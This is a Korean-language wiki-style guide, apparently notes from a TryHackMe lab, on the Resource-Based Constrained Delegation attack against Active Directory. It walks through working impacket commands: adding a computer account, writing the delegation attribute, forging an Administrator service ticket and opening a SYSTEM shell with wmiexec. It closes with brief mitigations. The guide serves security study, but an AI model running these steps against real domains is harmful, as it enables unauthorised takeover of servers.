---
layout: page
title: RBCD_(Resource-Based_Constrained_Delegation)
description: >
  This chapter covers the basics of content creation with Hydejack.
hide_description: true
sitemap: false
---

0. this unordered seed list will be replaced by toc as unordered list
{:toc}


# 리소스 기반 제한된 위임 (RBCD) 공격 가이드

RBCD(Resource-Based Constrained Delegation)는 기존의 제한된 위임(KCD)과 달리, 위임의 신뢰 관계를 리소스(예: 웹 서버) 측에서 설정하는 최신 위임 방식입니다. 이 공격은 공격자가 특정 컴퓨터 계정의 AD 개체 속성을 수정할 권한을 가질 때 발생하며, 이를 통해 해당 컴퓨터의 관리자 권한을 탈취할 수 있습니다.

### **공격 원리**

1.  공격자는 특정 컴퓨터(서버 B)의 AD 개체에 대한 쓰기 권한을 가집니다. (예: `GenericWrite`, `WriteDacl` 등)
2.  공격자는 자신이 제어하는 컴퓨터 계정(컴퓨터 A)을 생성하거나 이미 제어 중인 계정을 사용합니다.
3.  공격자는 서버 B의 `msDS-AllowedToActOnBehalfOfOtherIdentity` 속성을 수정하여, 컴퓨터 A가 서버 B에 대해 위임 권한을 갖도록 설정합니다.
4.  이제 컴퓨터 A는 KDC에 S4U2proxy 요청을 보내, 특정 사용자(예: `Administrator`)를 사칭하여 서버 B의 특정 서비스(예: `cifs`)에 접근할 수 있는 서비스 티켓을 발급받을 수 있습니다.
5.  공격자는 이 티켓을 사용하여 서버 B에 `Administrator` 권한으로 접속합니다.

---

### **1. 취약점 식별**

- **목표:** 현재 공격자가 제어하는 계정이 쓰기 권한을 가진 다른 컴퓨터 계정을 찾습니다.
- **핵심 도구:** BloodHound
- **분석:** BloodHound에서 `Find paths to computers with GenericWrite`와 같은 쿼리를 실행하여, 현재 사용자가 제어할 수 있는 컴퓨터 객체를 시각적으로 쉽게 찾을 수 있습니다.

![Pasted_image_20250812235330.png](/image/Pasted_image_20250812235330.png)

---

### **2. 단계별 공격 절차 (`impacket` 활용)**

#### **1단계: 공격자 제어 컴퓨터 계정 확보**
- 도메인 사용자는 기본적으로 10개의 컴퓨터 계정을 도메인에 추가할 수 있습니다. 이 권한을 사용하여 공격자가 제어할 컴퓨터 계정을 생성합니다.

```bash
impacket-addcomputer <domain.local>/<compromised_user>:<password> -computer-name <ATTACKER-PC>$

impacket-addcomputer -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Password1!' -dc-host $target -domain-netbios thm.local 'THM.LOCAL/SUSANNA_MCKNIGHT:REDACTED'
```

#### **2단계: RBCD 관계 설정**
- `impacket-rbcd`를 사용하여, 1단계에서 생성한 `ATTACKER-PC가 공격 대상 서버(`VICTIM-PC)에 대해 위임하도록 설정합니다.

```bash
# GUEST 계정이라 패스워드는 필요없음. 빈 해쉬로 진행
# :31d6cfe0d16ae931b73c59d7e0c089c0 이건 빈 해쉬라는 뜻

impacket-rbcd THM.LOCAL/guest -hashes :31d6cfe0d16ae931b73c59d7e0c089c0  -dc-ip $target -delegate-to LABYRINTH$ -delegate-from ATTACKERSYSTEM$ -action write 
```

#### **3단계: 서비스 티켓 요청 (S4U2proxy)**
- `impacket-getST`를 사용하여, `ATTACKER-PC`의 권한으로, `Administrator`를 사칭하여 `VICTIM-PC`의 `cifs` 서비스에 접근하는 티켓을 요청합니다.
- [[GetST]]

```bash
# -spn: 요청할 서비스의 SPN
# -impersonate: 사칭할 사용자
impacket-getST -impersonate Administrator THM.LOCAL/ATTACKERSYSTEM\$:'Password1!' -spn cifs/LABYRINTH.THM.LOCAL -dc-ip $target
```
- 이 명령이 성공하면, 현재 디렉터리에 `Administrator.ccache` 파일이 생성됩니다.

#### **4. Pass-the-Ticket 및 원격 접속**
- 생성된 티켓을 환경 변수에 등록하고, `-k` 옵션을 사용하는 `impacket` 도구로 원격 접속을 시도합니다.

```bash
# .ccache 파일을 Kerberos 인증에 사용하도록 설정
export KRB5CCNAME=Administrator.ccache

# -k: Kerberos 인증 사용
# -no-pass: 비밀번호 없이, 캐시된 티켓으로 인증
impacket-wmiexec -k -no-pass <domain.local>/Administrator@VICTIM-PC.domain.local
```
- 성공 시 `VICTIM-PC`의 `SYSTEM` 셸을 획득하게 됩니다.

---

### **3. 방어 (Mitigation)**

- **ACL 감사:** 컴퓨터 객체에 대한 `GenericWrite`, `WriteDacl` 등 위험한 쓰기 권한이 일반 사용자에게 부여되지 않도록 정기적으로 AD의 ACL을 감사합니다.
- **중요 계정 보호:** 도메인 관리자 등 중요 계정의 속성에서 "계정은 민감하므로 위임할 수 없음(Account is sensitive and cannot be delegated)" 옵션을 활성화하여 위임 공격의 대상으로 사용되는 것을 방지합니다.
